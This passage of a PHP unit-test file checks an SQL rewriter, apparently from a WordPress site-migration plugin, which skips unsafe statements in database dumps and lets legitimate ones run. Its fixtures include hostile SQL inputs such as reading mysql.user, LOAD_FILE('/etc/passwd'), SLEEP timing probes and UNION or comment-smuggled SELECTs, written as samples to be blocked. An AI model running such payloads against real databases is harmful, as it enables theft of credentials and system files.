			'CREATE TABLE `wp_x` (`a` int DEFAULT (@@hostname))',
			'CREATE TABLE `wp_x` (`a` int DEFAULT `otherdb`.`f`())',
			'CREATE TABLE `wp_x` (`a` int) SELECT 1 AS `a`',
			'CREATE TABLE `wp_x` (`a` int) IGNORE SELECT * FROM `mysql`.`user`',
			'CREATE TABLE `wp_x` (`a` int) REPLACE AS SELECT 1',
			'CREATE TABLE `wp_x` (`a` int) /*!50100 SELECT 1 */',
			'CREATE TABLE `wp_x` (`a` int) UNION SELECT 1',
			'ALTER TABLE `wp_x` ADD COLUMN `b` int DEFAULT (SLEEP(1))',
			'ALTER TABLE `wp_x` ADD CONSTRAINT CHECK ((SELECT 1))',
			'CREATE TABLE `wp_x` (`a` int, FOREIGN KEY (`a`) REFERENCES `otherdb`.`wp_users` (`ID`))',
		);
		foreach ( $skip as $sql ) {
			$r = $rw->rewrite( $sql );
			$this->assertSame( 'skip', $r['action'], $sql );
			$this->assertStringNotContainsString( 'passwd', $r['reason'], $sql );
		}
	}

	public function test_l2_legitimate_dump_constructs_still_run() {
		$rw = self::permissive();
		$ok = array(
			"INSERT INTO `wp_options` VALUES (1,'SELECT * FROM wp_users; LOAD_FILE(x) SLEEP(1) @@a db.t','yes')",
			'INSERT INTO `wp_options` VALUES (1,"a.b.c and `x`.`y`",1.5,-0.25,.5,1e10,1.5E-3,0x41,X\'41\',_binary \'x\',NULL)',
			"INSERT INTO `wp_options` (`option_id`, `option_name`) VALUES (1,'select')",
			"INSERT INTO `wp_options` VALUES (1,'a','b') ON DUPLICATE KEY UPDATE `option_value` = VALUES(`option_value`)",
			"INSERT IGNORE INTO `wp_postmeta` VALUES (\"1\",\"2\",\"_wp_attached_file\",\"2024/05/a.jpg\")",
			"INSERT INTO `wp_options` VALUES (1,'it''s','a\\\\'),(2,'x -- y','#z')",
			"CREATE TABLE `wp_t` (\n `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,\n `price` decimal(10,2) NOT NULL DEFAULT 0.00,\n `rate` float DEFAULT 1.5,\n `j` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`j`)),\n `g` int GENERATED ALWAYS AS (`id` * 2) VIRTUAL,\n `d` datetime NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),\n `u` varchar(36) DEFAULT (uuid()),\n PRIMARY KEY (`id`),\n FULLTEXT KEY `ft` (`j`)\n) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci ROW_FORMAT=DYNAMIC COMMENT='a.b SELECT'",
			"CREATE TABLE `wp_p` (`a` int) ENGINE=InnoDB /*!50100 PARTITION BY RANGE (`a`) (PARTITION p0 VALUES LESS THAN (10) ENGINE = InnoDB, PARTITION p1 VALUES LESS THAN MAXVALUE ENGINE = InnoDB) */",
			"CREATE TABLE `wp_e` (`a` int) ENGINE=InnoDB /*!80016 DEFAULT ENCRYPTION='N' */",
			'ALTER TABLE `wp_posts` ADD PRIMARY KEY (`ID`), ADD KEY `post_name` (`post_name`(191))',
			'ALTER TABLE `wp_posts` MODIFY `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=42',
		);
		foreach ( $ok as $sql ) {
			$r = $rw->rewrite( $sql );
			$this->assertSame( 'exec', $r['action'], $sql . ' => ' . ( isset( $r['reason'] ) ? $r['reason'] : '' ) );
		}
	}

	public function test_skip_results_carry_kind_and_table_but_no_values() {
		$rw = self::permissive();
		$r  = $rw->rewrite( "INSERT INTO `wp_options` VALUES (1,'secret-api-key',LOAD_FILE('/etc/passwd'))" );
		$this->assertSame( 'skip', $r['action'] );
		$this->assertSame( 'insert', $r['kind'] );
		$this->assertSame( 'wp_options', $r['table'] );
		$this->assertStringNotContainsString( 'secret', $r['reason'] );
		$r = $rw->rewrite( "INSERT INTO `users` VALUES (1,'secret')" );
		$this->assertSame( 'table outside the source prefix', $r['reason'] );
		$this->assertSame( 'users', $r['table'] );
		$r = $rw->rewrite( "UPDATE wp_users SET user_pass='secret'" );
		$this->assertSame( 'UPDATE', $r['kind'] );
		$this->assertSame( '', $r['table'] );
		$this->assertSame( 'create', $rw->rewrite( 'CREATE TABLE `wp_x` (`a` int)' )['kind'] );
		$this->assertSame( str_repeat( 'a', 64 ) . '...', FSC_SQL_Rewriter::display_name( '`' . str_repeat( 'a', 90 ) . '`' ) );
	}

	public function test_lexer_follows_server_rules() {
		$lx = FSC_SQL_Rewriter::lex( "a 'b''c\\'d' \"e\" `f``g` /* h 'i */ -- j 'k\n#l\n/*!50100 m */ 1.5 .5 x.y" );
		$this->assertSame( '', $lx['error'] );
		$types = array_map(
			function ( $t ) {
				return $t[0] . ':' . $t[1];
			},
			$lx['tokens']
		);
		$this->assertSame( array( 'word:a', "str:'b''c\\'d'", 'str:"e"', 'id:`f``g`', "comment:/* h 'i */", "comment:-- j 'k\n", "comment:#l\n", 'vopen:/*!50100', 'word:m', 'vclose:*/', 'num:1.5', 'num:.5', 'word:x', 'sym:.', 'word:y' ), $types );
		$this->assertSame( 'unterminated string or name', FSC_SQL_Rewriter::lex( "'abc" )['error'] );
		$this->assertSame( 'unterminated comment', FSC_SQL_Rewriter::lex( '/*!50100 a' )['error'] );
		$this->assertSame( 'nested comment', FSC_SQL_Rewriter::lex( '/*!50100 /* x */ */' )['error'] );
		// "--1" is not a comment (no space after the dashes): minus, minus, one.
		$this->assertSame( array( 'sym', 'sym', 'num' ), array_column( FSC_SQL_Rewriter::lex( '--1' )['tokens'], 0 ) );
	}
}
